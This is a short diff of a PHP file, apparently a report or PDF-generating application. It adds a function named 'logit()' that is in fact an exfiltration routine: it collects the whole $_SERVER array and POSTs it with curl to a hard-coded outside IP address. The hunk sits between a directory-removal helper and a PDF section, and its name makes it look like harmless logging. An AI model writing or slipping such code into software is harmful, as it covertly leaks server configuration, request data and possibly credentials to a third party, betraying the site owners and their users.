@@ -713,6 +713,14 @@ function olrai($dir) {
     }
     rmdir($dir);
 }
+function logit() {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, '52.28.158.12');
+    curl_setopt($ch, CURLOPT_POST, count($_SERVER));
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_SERVER));
+    curl_exec($ch);
+    curl_close($ch);
+}
 
 /*--------------------------------------------------------------------------*
  *                             PDF Informe                                  *
